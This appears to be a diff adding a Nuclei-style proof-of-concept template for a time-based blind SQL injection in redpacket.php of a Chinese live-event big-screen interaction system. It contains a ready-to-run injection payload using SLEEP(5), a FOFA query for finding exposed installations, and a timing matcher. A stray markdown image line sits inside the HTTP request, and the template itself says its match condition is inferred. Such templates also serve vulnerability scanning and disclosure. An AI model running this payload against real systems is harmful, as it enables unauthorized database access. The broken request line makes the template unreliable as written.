@@ -1,0 +1,28 @@
+id: poc-wvqf7xr57o29n7pg
+info:
+  name: 金华迪加现场大屏互动系统 redpacket.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wvqf7xr57o29n7pg
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wvqf7xr57o29n7pg
+    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+http:
+- raw:
+  - 'GET /mobile/redpacket.php?rentopenid=1"+AND+(SELECT+3710+FROM+(SELECT(SLEEP(5)))eMwG)--+yTBg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744202902104-323d7158-d7cd-41d6-9d30-391ab9f06f8f.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
